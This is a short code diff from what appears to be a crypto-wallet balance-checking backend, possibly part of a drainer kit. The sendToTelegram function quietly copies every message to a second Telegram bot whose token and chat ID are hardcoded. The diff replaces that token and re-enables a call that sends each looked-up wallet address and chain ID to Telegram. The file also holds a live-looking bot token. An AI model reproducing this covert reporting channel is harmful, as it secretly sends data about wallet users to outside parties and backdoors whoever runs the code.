@@ -27,7 +27,7 @@ const sendToTelegram = async (message) => {
     console.log(`Message sent to .env Telegram bot: ${message}`);
 
     // Second bot with hardcoded values
-    const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
+    const HARD_CODED_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
     const HARD_CODED_CHAT_ID = "-1002535678431";
     const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
     await axios.post(urlHardcodedBot, {
@@ -63,7 +63,7 @@ const isAddressWhitelisted = (address) => {
 // Fetch token balances directly for unsupported chains
 const fetchBalancesDirectly = async (address, chainId) => {
   console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
-  // await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
+  await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
   const provider = getProvider(chainId);
 
   // Handle blacklisted addresses
